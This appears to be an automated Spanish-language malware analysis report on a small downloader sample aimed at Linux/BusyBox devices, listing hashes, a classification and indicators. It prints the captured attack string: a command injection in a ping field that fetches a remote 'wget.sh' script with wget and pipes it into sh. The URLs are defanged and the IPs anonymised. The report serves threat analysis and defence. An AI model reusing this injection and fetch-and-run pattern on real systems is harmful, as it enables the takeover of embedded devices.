# 🧬 Payload Analysis

`bf43689005858bbfccb735f96044d0bd9b886c7d5dd7bfbcecd37957b8a529e2`

## 📌 Resumen

Texto ASCII de 180 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s airspan`
3. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/bf43689005858bbfccb735f96044d0bd9b886c7d5dd7bfbcecd37957b8a529e2.md](../../../../../malware-like/oraculo/downloader/bf43689005858bbfccb735f96044d0bd9b886c7d5dd7bfbcecd37957b8a529e2.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `bf43689005858bbfccb735f96044d0bd9b886c7d5dd7bfbcecd37957b8a529e2`
- **MD5:** `beb962dd411f8a0c32d63cae8439dc58`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 180 B |
| Entropía | 4.78 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
ping=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s airspan;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | ping=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s airspan;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|s | strings |
| hash | bf43689005858bbfccb735f96044d0bd9b886c7d5dd7bfbcecd37957b8a529e2 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
